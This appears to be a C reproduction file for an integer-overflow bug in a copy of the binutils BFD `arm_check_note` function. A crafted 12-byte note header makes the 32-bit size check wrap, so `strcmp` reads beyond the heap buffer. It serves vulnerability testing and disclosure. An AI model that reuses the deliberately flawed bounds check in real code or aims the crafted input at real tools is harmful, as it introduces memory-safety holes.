#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

/* Minimal stand-ins for BFD types used by the vulnerable code. */
typedef unsigned char bfd_byte;
typedef size_t bfd_size_type;
typedef struct bfd { int dummy; } bfd;

/* The note structure layout as in bfd/cpu-arm.c */
typedef struct
{
  unsigned char namesz[4]; /* Size of entry's owner string.  */
  unsigned char descsz[4]; /* Size of the note descriptor.   */
  unsigned char type[4];   /* Interpretation of the descriptor. */
  char          name[1];   /* Start of the name+desc data.   */
} arm_Note;

/* Little-endian 32-bit fetch, ignoring abfd endianness for this repro. */
static inline uint32_t bfd_get_32(bfd *abfd, const void *from)
{
  const unsigned char *p = (const unsigned char *)from;
  (void)abfd;
  return (uint32_t)p[0] | ((uint32_t)p[1] << 8) | ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

/* Vulnerable function (reproduced with the same flawed overflow check using 32-bit arithmetic). */
static bool arm_check_note(bfd *abfd,
                           bfd_byte *buffer,
                           bfd_size_type buffer_size,
                           const char *expected_name,
                           char **description_return)
{
  uint32_t namesz;
  uint32_t descsz;
  uint32_t type;
  char *descr;

  if (buffer_size < offsetof(arm_Note, name))
    return false;

  namesz = bfd_get_32(abfd, buffer);
  descsz = bfd_get_32(abfd, buffer + offsetof(arm_Note, descsz));
  type   = bfd_get_32(abfd, buffer + offsetof(arm_Note, type));
  descr  = (char *) buffer + offsetof(arm_Note, name);

  /* Flawed overflow check: performed in 32-bit arithmetic and compared to buffer_size. */
  uint32_t sum = namesz + descsz + (uint32_t)offsetof(arm_Note, name);
  if (sum > buffer_size)
    return false;

  if (expected_name == NULL)
    {
      if (namesz != 0)
        return false;
    }
  else
    {
      if (namesz != ((uint32_t)(strlen(expected_name) + 1 + 3) & ~3U))
        return false;

      /* This strcmp can read out-of-bounds if descr points past buffer, which
         the wrapped check above fails to prevent. */
      if (strcmp(descr, expected_name) != 0)
        return false;

      descr += (namesz + 3) & ~3U;
    }

  (void) type; /* Unused in this repro */

  if (description_return != NULL)
    *description_return = descr;

  return true;
}

int main(void)
{
  /* Craft a buffer that triggers 32-bit wrap in the size check. */
  /* We set namesz = 4 (for "GNU\0"), descsz = 0x100000000 - (namesz + offsetof(name))
     so that namesz + descsz + offsetof(name) wraps to 0 (in 32-bit), which is <= buffer_size. */
  const char *expected_name = "GNU";
  size_t off = offsetof(arm_Note, name); /* Typically 12 */
  uint32_t namesz = 4; /* (strlen("GNU") + 1) rounded to 4-byte alignment */
  uint32_t descsz = (uint32_t)(0u - (namesz + (uint32_t)off)); /* e.g., 0xFFFFFFF0 if off=12 */
  uint32_t type = 0;

  /* Deliberately provide a buffer whose size is exactly 'off'. This makes 'descr' point to
     one-past-the-end, so strcmp will read OOB if the overflow check passes. */
  bfd_size_type buffer_size = off; /* 12 */
  bfd_byte *buffer = (bfd_byte *)malloc(buffer_size);
  if (!buffer) { perror("malloc"); return 1; }

  /* Fill header fields within bounds [0, buffer_size). */
  buffer[0] = (unsigned char)(namesz & 0xFF);
  buffer[1] = (unsigned char)((namesz >> 8) & 0xFF);
  buffer[2] = (unsigned char)((namesz >> 16) & 0xFF);
  buffer[3] = (unsigned char)((namesz >> 24) & 0xFF);

  buffer[4] = (unsigned char)(descsz & 0xFF);
  buffer[5] = (unsigned char)((descsz >> 8) & 0xFF);
  buffer[6] = (unsigned char)((descsz >> 16) & 0xFF);
  buffer[7] = (unsigned char)((descsz >> 24) & 0xFF);

  buffer[8]  = (unsigned char)(type & 0xFF);
  buffer[9]  = (unsigned char)((type >> 8) & 0xFF);
  buffer[10] = (unsigned char)((type >> 16) & 0xFF);
  buffer[11] = (unsigned char)((type >> 24) & 0xFF);

  bfd dummy_abfd = {0};
  char *descr_ret = NULL;

  /* This call should trigger an out-of-bounds read in strcmp due to the integer overflow
     in the boundary check. With ASan, this will be reported as a heap-buffer-overflow. */
  (void)arm_check_note(&dummy_abfd, buffer, buffer_size, expected_name, &descr_ret);

  /* If it didn't crash (unexpected), clean up and exit. */
  free(buffer);
  return 0;
}
